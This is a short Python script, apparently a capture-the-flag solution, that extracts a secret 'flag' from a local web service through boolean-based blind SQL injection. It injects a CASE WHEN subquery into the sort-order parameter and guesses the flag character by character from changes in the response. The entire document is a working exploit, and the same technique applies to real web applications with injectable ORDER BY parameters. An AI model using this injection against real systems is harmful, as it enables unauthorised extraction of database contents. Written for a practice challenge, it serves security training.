#!/usr/bin/env python3

import requests
import string

url = 'http://localhost:1337'
chars = string.ascii_lowercase + string.ascii_uppercase + '0123456789' + '{}_'
inject = "CASE WHEN (SELECT SUBSTR(flag,{},1) FROM flag)='{}' THEN name ELSE numeric END"

flag = ''
index = 1
char = 'f'

while True:
    for char in chars:
        req = requests.post(url, data= { 'search': '', 'order': inject.format(index, char) })
        res = req.text.split('\n')
        # print ("trying: ", char)
        if 'ALA' in res[123]:
            flag += char
            index+=1
            print(flag)
            break
    if flag[-1] == '}':
       break
